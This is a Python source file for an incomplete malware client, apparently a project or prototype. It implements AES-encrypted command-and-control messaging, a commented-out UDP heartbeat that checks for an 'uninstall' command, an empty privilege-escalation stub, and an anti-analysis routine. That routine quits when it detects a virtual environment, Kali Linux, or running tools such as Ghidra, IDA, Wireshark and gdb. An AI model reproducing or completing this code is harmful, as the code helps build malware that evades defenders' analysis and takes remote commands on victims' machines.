import socket
import base64
import sys
import os
import psutil
import threading
import subprocess
from subprocess import DEVNULL, STDOUT, check_call
import time
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

AntiDebug = False

def build_message(message, key):
    message_encoded = base64.b64encode(message)
    pre_aes = str(node_id) + "_" + message_encoded.decode()
    plaintext = pre_aes.encode()
    nonce = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, nonce)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    nonce_encoded = base64.b64encode(nonce).decode()
    ciphertext_encoded = base64.b64encode(ciphertext).decode()
    final_output = nonce_encoded + "_" + ciphertext_encoded
    return final_output.encode()


def deconstruct_message(message, key):
    nonce_encoded, ciphertext_encoded = message.decode().strip().split("_")
    nonce = base64.b64decode(nonce_encoded)
    ciphertext = base64.b64decode(ciphertext_encoded)
    cipher = AES.new(key, AES.MODE_CBC, nonce)
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return plaintext.decode()

def privesc():
    pass

def antidebug():
    global AntiDebug
    black_list_programs = ["binaryninja", "ida", "ghidrarun", "ghidra", "wireshark", "gdb", \
    "valgrind", "objdump", "strings"]

    # Check if we are running in virtual machine, if so, exit
    if (hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') 
        and sys.base_prefix != sys.prefix)):
        quit()

    # Check if we are running on kali
    output = subprocess.check_output("lsb_release -a", shell=True, stderr=DEVNULL)
    if bytes("Kali", encoding='utf8') in output:
        quit()

    AntiDebug = True

    # Check if blacklisted program is running, and if so, exit
    while True:
        time.sleep(1)

        for program in black_list_programs:
            for proc in psutil.process_iter():
                if program in proc.name() or program in proc.name().lower():
                    quit()

# For testing, the main program will print out the symmetric key in the beginning, 
# paste it below before running
def main():
    global AntiDebug

    if len(sys.argv) != 2:
        print("USAGE: python3 "+sys.argv[0]+" ENCRYPTION_KEY")
        sys.exit(1)

    # Setup encryption key
    #key = bytes.fromhex(sys.argv[1])
    #heartbeat_message = b"heartbeat"
    #node_id = 69420

    # Start thread to handle anti-debug in the background
    th = threading.Thread(target=antidebug)
    th.start()

    # Make sure anti-debug successfuly completed before continuing execution
    while not AntiDebug:
        pass

    privesc()

    print("starting malware")

    """
    IP = "127.0.0.1"
    PORT = 53045

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client_socket.sendto(build_message(heartbeat_message, key), (IP, PORT))
    recv = client_socket.recvfrom(4096)
    print(recv)
    plaintext = deconstruct_message(recv[0], key)
    print(plaintext)
    if plaintext.strip() == 'uninstall':
        client_socket.sendto(build_message(b"uninstall ack", key), (IP, PORT))
    client_socket.close()
    """

    th.join()

if __name__ == "__main__":
    main()

